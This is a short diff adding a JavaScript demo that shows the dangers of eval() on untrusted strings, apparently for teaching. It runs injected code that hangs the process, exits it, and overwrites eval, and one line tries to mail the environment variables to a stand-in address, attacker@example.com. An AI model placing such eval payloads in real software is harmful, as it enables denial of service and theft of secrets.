@@ -1,0 +1,17 @@
+// Guess what?
+eval("while(true) console.log(1)");
+console.log("The application goes on...");
+
+// What if the attacker doesn't want to waste time?
+eval("process.exit(0)");
+console.log("The application goes on...");
+
+// Let's escalate...
+eval("require('node-mailer')" +
+  ".mail('attacker@example.com'," +
+    "JSON.stringify(process.ENV))");
+console.log("The application goes on...");
+
+// And, for the lolz:
+eval("eval = undefined");
+console.log("The application goes on...");
